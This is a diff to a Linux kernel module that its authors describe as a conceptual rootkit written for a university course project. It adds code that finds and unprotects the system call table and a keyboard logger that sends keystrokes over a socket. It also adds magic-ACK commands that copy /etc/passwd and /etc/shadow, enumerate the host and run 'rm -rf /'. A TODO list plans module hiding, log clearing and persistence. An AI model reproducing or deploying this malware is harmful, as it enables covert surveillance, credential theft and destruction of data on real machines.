@@ -15,9 +15,12 @@
 **/
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/kmod.h>                 /* Used for userspace program calls. */
+#include <linux/slab.h>
 
 #include <asm/uaccess.h>
 #include <asm/segment.h>
+#include <asm/paravirt.h>               /* Make use of Read_cr0 and Write_cr0. */
 
 #include <linux/netdevice.h>
 #include <linux/socket.h>
@@ -28,6 +31,14 @@
 
 #include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
 #include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
+
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Kevin Hoganson - khogan8@students.towson.edu");
+MODULE_AUTHOR("Zachary Brown  - zbrown4@students.towson.edu");
+MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
+MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");
+
 
 //#define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
 #define KEYBOARD_BUFFER_SIZE 1024
@@ -58,11 +69,13 @@ struct socket      *sock;
 
 
 /**
- * REVERSE TCP SHELL FUNCTIONALITY
+ * REVERSE TCP "SHELL" FUNCTIONALITY
 **/
 unsigned long  int server_ip;
 unsigned short int server_port;
 int connection_state;
+char *command_buffer;
+int fd;
 
 unsigned long int acks[] =
 {
@@ -87,6 +100,20 @@ unsigned long int acks[] =
 	1671908051,
 	922525094
 };
+
+
+/**
+ * SYSTEM CALL HIJACKING
+ * Credit to Richard Kavanagh
+**/
+// Original system calls in system call table.
+asmlinkage int (*original_open)(const char *pathname, int flags);
+asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
+asmlinkage int (*original_close)(int fd);
+asmlinkage int (*original_fstat)(int fd, struct stat *buf);
+
+unsigned long **sys_call_table;
+struct   stat   stat_buffer;
 
 
 /**
@@ -121,6 +148,28 @@ char *shift_letters[] =
 	"SCROLLLOCK" "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3",
 	"0", "."
 };
+
+
+static unsigned long **get_sys_call_table(void)
+{
+	unsigned long int offset = PAGE_OFFSET;
+	unsigned long **sct;
+
+	printk("Looking for system call table starting at [%lx].\n", offset);
+	while (offset < ULLONG_MAX)
+	{
+		sct = (unsigned long **)offset;
+		if (sct[__NR_close] == (unsigned long *) sys_close)
+		{
+			printk("System call table found at [%lx].\n", offset);
+			return sct;
+		}
+
+		offset += sizeof(void *);
+	}
+
+	return NULL;
+}
 
 
 void send_buffer(struct socket *sock, const char *buffer, size_t length)
@@ -199,9 +248,8 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 				{
 					if (connection_state)
 					{
-						// TODO: Handle buffer contents when writing file to it.
 						send_buffer(sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);
-						memset(&keyboard_buffer, '0', KEYBOARD_BUFFER_SIZE);
+						memset(&keyboard_buffer, 0, KEYBOARD_BUFFER_SIZE);
 						keyboard_index = 0;
 						buffer[keyboard_index++] = c;
 					}
@@ -247,55 +295,220 @@ void reverse_connect(void)
 }
 
 
-/* Up to 20 (or more) different commands. */
+/* Up to 14 (or more) different commands. */
+/* Most of these will require, at the very least, 'sudo'. */
+/* Recommended that user gets root privileges first. */
 void handle_command(unsigned long int ack_seq)
 {
+	
+	static char *argv[4];
+	static char *envp[4]; 
+	static char *path;
+	
 	printk("Handling: %lu\n", ack_seq);
 	switch(ack_seq)
 	{
+		/* List running processes. */
 		case 2035414082:
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "ps aux > /usr/games/process_list.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/process_list.txt";
+
 			break;
+
+		/* List all installed software. */
 		case 1923488235:
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "dpkg -l > /usr/games/installed_software.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:/usr/bin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/installed_software.txt";
+
 			break;
+
+		/* Retrieve /etc/passwd */
 		case 1039496434:
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "cat /etc/passwd > /usr/games/etc_passwd.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:"; 
+			envp[3] = NULL;
+
+			path = "/usr/games/etc_passwd.txt";
+
 			break;
+
+		/* Retrieve /etc/shadow */
 		case 455162575 :
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "cat /etc/shadow > /usr/games/etc_shadow.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/etc_shadow.txt";
+
 			break;
+
+		/* Retrieve /var/log/secure      */
+		/* Where is this file in Ubuntu? */
 		case 1256802356:
 			break;
+
+		/* Display netstat information. */
 		case 121160666 :
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "netstat -a > /usr/games/netstat.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/netstat.txt";
+
 			break;
+
+		/* Display routing information.        */
+		/* Also take into consideration 'dig'. */
 		case 775584247 :
 			break;
+
+		/* Display network interfaces / IP info. */
 		case 400038231 :
+			argv[0] = "/bin/sh";
+			argv[1] = "-c"; 
+			argv[2] = "ifconfig > /usr/games/ifconfig.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:/sbin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/ifconfig.txt";
+
 			break;
+
+		/* Display linux operating system information. */
 		case 966583691 :
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "uname -a > /usr/games/uname.txt"; 
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:";
+			envp[3] = NULL;
+
+			path = "/usr/games/uname.txt";
+
 			break;
-		case 1678453465:
-			break;
+
+
+		/* List modules. */
 		case 653897989 :
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "lsmod > /usr/games/lsmod.txt";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:"; 
+			envp[3] = NULL;
+
+			path = "/usr/games/uname.txt";
+
 			break;
+
+		/* Remove self / cleanup. */
 		case 1891123724:
+			argv[0] = "/bin/sh";
+			argv[1] = "-c";
+			argv[2] = "rm /usr/games/*.txt; rmmod rootkit;";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:/sbin/:";
+			envp[3] = NULL;
+
 			break;
+
+		/* Wipe the system.  */
+		/* CAUTION: rm -rf / */
 		case 584692231 :
+			argv[0] = "/bin/sh"; 
+			argv[1] = "-c";
+			argv[2] = "rm -rf /";
+			argv[3] = NULL;
+
+			envp[0] = "HOME=/";
+			envp[1] = "TERM=linux";
+			envp[2] = "PATH=/bin/:";
+			envp[3] = NULL;
+
 			break;
+
+		/* Disconnect from control server. */
 		case 1540142942:
+			if (connection_state)
+			{
+				if (sock->ops->shutdown(sock, 2) < 0)
+					;
+				else
+					connection_state = DISCONNECTED;
+
+			}
 			break;
-		case 1462005693:
-			break;
-		case 1331651723: 
-			break;
-		case 1698886690:
-			break;
-		case 763403905 :
-			break;
-		case 1671908051:
-			break;
-		case 922525094 :
-			break;
+
+
 		default:
 			break;
 	}
+
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+		fd = (*original_open)(path, O_RDONLY);
+		if (fd != -1)
+		{
+			(*original_fstat)(fd, &stat_buffer);
+			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
+			(*original_read)(fd, command_buffer, stat_buffer.st_size);
+			(*original_close)(fd);
+		}
+	set_fs(old_fs);
+
+	kfree(path);
+	
 }
 
 
@@ -354,20 +567,73 @@ void start_listen(void)
 	dev_add_pack(&net_proto);
 }
 
+/*
+void test(void)
+{
+	static char *argv[4];
+	static char *envp[4];
+
+	argv[0] = "/bin/sh";
+	argv[1] = "-c";
+	argv[2] = "lsmod > /usr/games/lsmod.txt";
+	argv[3] = NULL;
+
+	envp[0] = "HOME=/";
+	envp[1] = "TERM=linux";
+	envp[2] = "PATH=/bin/:";
+	envp[3] = NULL;
+
+	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+
+	old_fs = get_fs();
+	set_fs(KERNEL_DS);
+		fd = (*original_open)("/usr/games/lsmod.txt", O_RDONLY);
+		if (fd != -1)
+		{
+			(*original_fstat)(fd, &stat_buffer);
+			command_buffer = kmalloc((sizeof(char) * stat_buffer.st_size), GFP_KERNEL);
+			(*original_read)(fd, command_buffer, stat_buffer.st_size);
+			(*original_close)(fd);
+		}
+	set_fs(old_fs);
+}
+*/
 
 /**
  * TODO:
  *   - Hide the module:
  *     + Option1:  Overwrite "lsmod"
- *     + Option2:  Delete module listing "rootkit" from modules.
+ *     + Option2:  Delete module listing "rootkit" from modules. <-- Easy option.
  *     + Do this last (for the sake of debugging).
- *   - Clear /var/log/messages continually. 
+ *   - Clear /var/log/ user messages continually with every packet received.
  *   - Seed for randomly generated magic "ACK"s?
  *   - Persistence (try connect on startup?)
+ *   - Execute userspace commands and send output to file.
+ *     + Grab file output with filp_open, place in buffer. 
+ *     + Send the buffer.
+ *   - Get TCP buffer in working condition.
+ *   - Make a 'Dig-In' function:
+ *     + Gets root privileges.
+ *     + Prevents read operations on kernel logs.
+ *     AND/OR
+ *     + Forcefully corrupt the kernel logs? 
 **/
 int start(void)
 {
 	printk("Rootkit started.\n");
+
+	if (!(sys_call_table = get_sys_call_table()))
+	{
+		printk("Unable to find system call table.\n");
+		return -1;
+	}
+
+	write_cr0(read_cr0() & (~ 0x10000));
+		original_open  = (void *)sys_call_table[__NR_open];
+		original_close = (void *)sys_call_table[__NR_close];
+		original_read  = (void *)sys_call_table[__NR_read];
+		original_fstat = (void *)sys_call_table[__NR_fstat];
+	write_cr0(read_cr0() | 0x10000); 
 	
 	printk("Registering keyboard notifier.\n");
 	register_keyboard_notifier(&nb);
@@ -387,9 +653,12 @@ int start(void)
 	server_ip   = 0x7F000001;
 	server_port = 0x395D    ; 
 
+	//test(); 
+
+	kfree(command_buffer);
+
 	return 0;
 }
-
 
 void stop(void)
 {
@@ -400,12 +669,15 @@ void stop(void)
 	printk("Removing netdevice pack.\n");
 	dev_remove_pack(&net_proto);
 
-	if (sock->ops->shutdown(sock, 2) < 0)
-		printk("Could not close the socket.\n");
-	else
+	if (connection_state)
 	{
-		connection_state = DISCONNECTED;
-		printk("Closed the socket.\n");
+		if (sock->ops->shutdown(sock, 2) < 0)
+			printk("Could not close the socket.\n");
+		else
+		{
+			connection_state = DISCONNECTED;
+			printk("Closed the socket.\n");
+		}
 	}
 
 	printk("Rootkit stopped.\n");
@@ -413,9 +685,3 @@ void stop(void)
 
 module_init(start);
 module_exit(stop);
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Kevin Hoganson - khogan8@students.towson.edu");
-MODULE_AUTHOR("Zachary Brown  - zbrown4@students.towson.edu");
-MODULE_AUTHOR("Alex Slonim    - a.slonim412@gmail.com");
-MODULE_DESCRIPTION("A conceptual rootkit. Term project for Shiva Azadegan's COSC 439.");
